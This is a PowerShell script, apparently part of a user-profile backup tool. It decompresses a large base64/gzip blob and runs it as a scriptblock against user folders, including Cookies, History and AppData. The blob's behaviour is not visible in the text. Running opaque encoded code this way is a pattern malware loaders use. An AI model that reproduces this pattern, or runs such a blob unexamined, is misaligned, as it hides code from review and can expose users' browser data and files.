Param(
    $Personal,
    $Desktop,
    $Favorites,
    $MyMusic,
    $MyPic,
    $MyVideo,
    $Downloads,
    $SavedGames,
    $Contacts,
    $Searches,
    $Links,
    $Cookies,
    $Cache,
    $History,
    $Recent,
    $TempFile,
    $AppData,
    $FileAppend);
$ZipCode = @"
using System;
using System.IO;
using System.IO.Compression;
using System.Text;


    public class ZipCode
    {
        public  ZipCode()
        {

        }


        public string Zip(string text)
        {
            byte[] buffer = Encoding.UTF8.GetBytes(text);
            MemoryStream memoryStream = new MemoryStream();
            using (GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Compress, true))
            {
                gZipStream.Write(buffer, 0, buffer.Length);
            }

            memoryStream.Position = 0;

            byte[] compressedData = new byte[memoryStream.Length];
            memoryStream.Read(compressedData, 0, compressedData.Length);

            byte[] gZipBuffer = new byte[compressedData.Length + 4];
            Buffer.BlockCopy(compressedData, 0, gZipBuffer, 4, compressedData.Length);
            Buffer.BlockCopy(BitConverter.GetBytes(buffer.Length), 0, gZipBuffer, 0, 4);

            return Convert.ToBase64String(gZipBuffer);       
         }

        public string Unzip(string compressedText)
        {
            byte[] gZipBuffer = Convert.FromBase64String(compressedText);
            using (MemoryStream memoryStream = new MemoryStream())
            {
                int dataLength = BitConverter.ToInt32(gZipBuffer, 0);
                memoryStream.Write(gZipBuffer, 4, gZipBuffer.Length - 4);

                byte[] buffer = new byte[dataLength];

                memoryStream.Position = 0;
                using (GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Decompress))
                {
                    gZipStream.Read(buffer, 0, buffer.Length);
                }

                return Encoding.UTF8.GetString(buffer);
            }
        }
    }
"@;

Add-Type -TypeDefinition $ZipCode;

$envbackupzipps="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";
$zipinst = New-Object -TypeName ZipCode;
$envbackps = $zipinst.Unzip($envbackupzipps);

$scriptblock =  [scriptblock]::Create($envbackps);
Invoke-Command -ScriptBlock $scriptblock  -ArgumentList      $Personal,$Desktop,$Favorites,$MyMusic,$MyPic,$MyVideo,$Downloads,$SavedGames,$Contacts,$Searches,$Links,$Cookies,$Cache,$History,$Recent,$TempFile,$AppData,$FileAppend;


